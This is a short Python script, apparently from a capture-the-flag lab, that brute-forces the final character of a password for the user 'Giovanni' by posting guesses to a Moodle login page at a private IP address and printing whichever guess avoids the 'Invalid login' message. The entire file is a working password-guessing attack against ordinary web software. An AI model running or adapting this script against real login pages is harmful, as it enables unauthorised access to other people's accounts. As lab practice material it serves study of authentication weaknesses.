import requests as r

characters = "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()"
for i in characters:
    
    creds = {
        "username": "Giovanni",
        "password": "Th4C00lTheacha" + i
    }
    
    req = r.post("http://10.10.10.153/moodle/login/index.php", data=creds)

    err_message = "Invalid login"
    if err_message not in req.text: 
        
        print("PASSWORD: " + creds["password"])
        break
